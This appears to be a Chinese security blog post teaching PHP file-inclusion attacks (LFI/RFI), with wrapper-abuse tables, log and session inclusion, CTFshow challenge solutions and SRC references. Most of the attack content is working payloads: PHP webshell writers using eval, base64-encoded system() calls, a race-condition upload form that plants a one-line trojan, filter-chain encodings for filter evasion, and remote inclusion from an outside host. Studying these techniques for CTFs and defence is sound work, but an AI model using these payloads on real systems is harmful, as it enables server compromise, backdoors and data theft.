---
title: 文件包含&LFI&RFI&伪协议条件&编码算法&无文件利用&JAVA应用&SRC复盘
published: 2026-07-05T16:00:00
description: 文件包含漏洞的原理、分类（LFI与RFI）、白盒与黑盒的审计思路，并重点梳理了本地利用（如日志包含、SESSION包含、伪协议利用）和远程利用的各种实战技巧。同时结合CTF题目与SRC案例
tags:
  - Web攻防
  - 文件包含
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-文件包含-LFI&RFI利用思路
2. WEB攻防-文件上传-伪协议玩法&无文件
3. WEB攻防-文件上传-黑白盒案例&SRC复盘

# 原理

包含文件：代码去解析执行这个文件，文件的格式不重要

程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，

直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。

在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞

```php
 <?php include "xx.xx";?> 这种是包含指定页面，不存在文件包含漏洞
 <?php include $_GET[x];?> 这种通过动态变量的传参才存在文件包含漏洞
```

# 分类

## 本地包含-Local File Include-LFI

```bash
（包含的文件都是本地服务器上的,可以包含图片马，敏感文件，日志等等）x.php?x=xx.xx
```

## 远程包含-Remote File Include-RFI

不需要借助文件上传等操作

```bash
x.php?x=http://xxxxx/x.xx （要保证php.ini中allow_url_fopen和allow_url_include要为On）
```

差异原因：代码过滤和环境配置文件开关决定

# 白盒审计：（CTFSHOW）

白盒发现：

1、可通过应用功能追踪代码定位审计

2、可通过脚本特定函数搜索定位审计

3、可通过伪协议玩法绕过相关修复等

PHP：include、require、include_once、require_once等

include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行

require函数出现错误的时候，会直接报错并退出程序的执行

Java：java.io.File、java.io.FileReader等

ASP.NET：System.IO.FileStream、System.IO.StreamReader等

# 黑盒分析：

黑盒发现：主要观察参数传递的数据和文件名是否对应

URL中有path、dir、file、page、archive、eng、语言文件等相关字眼

# 本地利用思路

## 配合文件上传

无需多解释

## 无文件包含日志（知道路径，默认路径测试）

知道目标站点是什么语言、框架、中间件，然后根据这些去找对应的日志，比如apache的日志

从而直接在日志中植入恶意后门代码，无需进行文件上传等操作

## 无文件包含SESSION（知道路径，默认路径测试）

知道目标站的session文件存储路径，通过抓包修改session文件，在其中写入后门，再包含该session文件即可，跟网站日志包含相同

## 无文件支持伪协议利用

主要条件就是对方的php.ini的设置

|        伪协议         |         核心用途         |     最低版本     |                    关键配置 (php.ini)                    |                                                                                 利用用法示例                                                                                 |
| :----------------: | :------------------: | :----------: | :--------------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| **`php://input`**  |       **代码执行**       | PHP >= 5.2.0 |               `allow_url_include = On`               |                                                  `?file=php://input`  <br>**POST Body:** `<?php system('whoami'); ?>`                                                  |
|   **`data://`**    |       **代码执行**       | PHP >= 5.2.0 | `allow_url_fopen = On`  <br>`allow_url_include = On` |                          `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=`  <br>（Base64解码后为 `<?php system('whoami'); ?>`）                          |
| **`php://filter`** | **文件读取**  <br>（源码获取） | PHP >= 5.0.0 |                        无特殊要求                         |                                   `?file=php://filter/read=convert.base64-encode/resource=index.php`  <br>返回Base64编码的源码，解码即可读取敏感信息。                                    |
|    **`zip://`**    |       **文件包含**       | PHP >= 5.2.0 |                        无特殊要求                         |                       **前提**：服务器上有 `.zip` 文件（如通过上传或已存在）。  <br>`?file=zip:///path/to/shell.zip%23shell.txt`  <br>（`%23` 是 `#` 的URL编码，表示指定压缩包内的文件）                       |
|   **`phar://`**    |      **反序列化攻击**      | PHP >= 5.3.0 |                        无特殊要求                         |                                      生成恶意 `phar` 文件并上传，通过 `phar://` 触发反序列化链。  <br>`?file=phar:///path/to/malicious.phar/test.txt`                                      |
|   **`file://`**    |     **文件包含/读取**      | PHP >= 5.2.0 |                        无特殊要求                         | `?file=file:///etc/passwd`  <br>（实际测试中常简写为 `?file=/etc/passwd`，因为 `file://` 是默认协议）   。**注意**：如果目标是 PHP 文件（如 `index.php`），它会被**执行**而不是显示源码，所以通常配合 `php://filter` 来读取源码。 |

实战注意：

虽然 `file://` 协议在特定版本中可被用于远程文件包含，但在实际攻击中，由于目标环境通常存在严格的 **URL 过滤** 和 **出网策略限制**，加之高版本 PHP 对其解析严格，因此其利用成功率较低。相比之下，**`php://input`** 协议因其 **数据本地传输、无需目标服务器外连、兼容性更好** 的特点，在文件包含漏洞利用中更为常见和可靠。

文件读取：

```
file:///etc/passwd
php://filter/read=convert.base64-encode/resource=phpinfo.php
```

1、**`file:///etc/passwd`，需要知道绝对路径**

2、**`php://filter/read=convert.base64-encode/resource=phpinfo.php`，使用base64编码读取当前网站目录下的phpinfo.php，当读取到空白时代表这个文件不存在，如果存在的话需要利用解码还原内容**

文件写入：

```
php://filter/write=convert.base64-encode/resource=phpinfo.php //这个需要代码里接收两个参数才行
php://input POST:<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```

1、`php://filter/write=convert.base64-encode/resource=phpinfo.php //这个需要代码里接收两个参数才行`，**同样写入的值要经过base64编码**

2、**用 php://input 传 payload**：

`url:port?file=php://input`，POST发送：`POST:<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>`，

代码执行：

```
php://input POST:<?php phpinfo();?>
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

1、`php://input`，POST发送：`POST:<?php phpinfo();?>`

2、`data://text/plain,<?php phpinfo();?>`

3、`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b`，PD9waHAgcGhwaW5mbygpOz8%2b就是经过base64加密的`<?php phpinfo();?>;`

# 远程利用思路

直接搭建一个可访问的远程URL包含文件

# CTF方向

https://ctf.show/challenges

## 78-php&http协议

```
payload:?file=php://filter/read=convert.base64-encode/resource=flag.php

payload: ?file=php://input post:<?php system('tac flag.php');?>

payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
```

## 79-data&http协议

```
payload: ?file=data://text/plain,<?=system('tac flag.*');?>

payload:?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==

payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
```

## 80-81-日志包含(已知路径)

1、利用其他协议,如file,zlib等

2、利用日志记录UA特性包含执行

分析需文件名及带有php关键字放弃

故利用日志记录UA信息，UA带入代码

包含：/var/log/nginx/access.log

## 82-86-SESSION包含(已知路径)

利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含

已知存储session文件的路径以及文件名特征（比如sess_xxx）

通过修改数据包中的cookie值来自定义存储的session名字

session会自动把内容清空，所以要在清空之前利用条件竞争方式触发session里的代码

自定义session名字，利用[条件竞争](WebSec0x14#逻辑不严-条件竞争)，不断发包和访问来触发sess_自定义名称中的代码，从而生成一个带有一句话木马的shell.php文件

```
<!DOCTYPE html>
<html>
<body>
<form action="目标地址" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1])?>'?>" />
<input type="file" name="file" />
<input type="submit" value="submit" />
</form>
</body>
</html>
```

https://www.cnblogs.com/lnterpreter/p/14086164.html

https://www.cnblogs.com/echoDetected/p/13976405.html

## 87-php://filter/write&加密编码

1、利用base64:

url编码2次：php://filter/write=convert.base64-decode/resource=123.php

```
content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
```

2、利用凯撒13：

url编码2次：php://filter/write=string.rot13/resource=2.php

```
content=<?cuc riny($_CBFG[1]);?>
```

## 88-data&base64协议

过滤PHP，各种符号，php代码编码写出无符号base64值

```
Payload：file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk
```

## 117-php://filter/write&新的算法

convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用

```
<?php
$result = iconv("UCS-2LE","UCS-2BE", '<?php eval($_POST[a]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);
?>
```

```
Payload：?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
```

```
contents=?<hp pvela$(P_SO[T]a;)>?
```

# 实战方向

SRC复盘报告

https://mp.weixin.qq.com/s/hMUDDgRSPY6ybznYBRZ20Q

http://testphp.vulnweb.com/showimage.php?file=index.php